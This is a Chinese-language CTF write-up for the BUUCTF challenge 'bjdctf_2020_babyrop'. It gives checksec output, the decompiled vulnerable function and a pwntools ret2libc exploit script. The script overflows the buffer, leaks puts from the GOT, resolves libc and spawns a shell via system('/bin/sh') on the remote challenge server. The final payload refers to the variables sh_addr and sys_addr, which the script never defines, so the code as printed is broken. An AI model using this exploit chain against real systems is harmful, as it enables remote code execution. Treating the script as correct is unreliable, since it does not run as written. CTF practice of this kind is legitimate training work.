# bjdctf_2020_babyrop

## 保护

```bash
$ checksec --file=2020
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```



## main函数

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  init(argc, argv, envp);
  vuln();
  return 0;
}
```



## vuln函数

```c
ssize_t vuln()
{
  char buf[32]; // [rsp+0h] [rbp-20h] BYREF

  puts("Pull up your sword and tell me u story!");
  return read(0, buf, 0x64uLL);
}
```



## EXP

0x20的长度溢出+8位

通过puts函数泄露libc基址

重新回到main，溢出到system

```python
from pwn import * 
from LibcSearcher import *

r=remote('node4.buuoj.cn',25825)
#r=process('./2020')
elf=ELF('./2020')

puts_plt=elf.plt['puts']
puts_got=elf.got['puts']
main_addr=0x4006AD
rdi_addr=0x400733

payload=b'a'*40+p64(rdi_addr)+p64(puts_got)+p64(puts_plt)+p64(main_addr)
r.sendlineafter('story!',payload)
r.recv()
puts_addr=u64(r.recv(6).ljust(8,b'\x00'))

libc=LibcSearcher('puts',puts_addr)
offset=puts_addr-libc.dump('puts')
system_addr=offset+libc.dump('system')
bin_sh=offset+libc.dump('str_bin_sh')

payload2=b'a'*40+p64(rdi_addr)+p64(sh_addr)+p64(sys_addr)
r.sendlineafter('story!',payload2)

r.interactive()
```

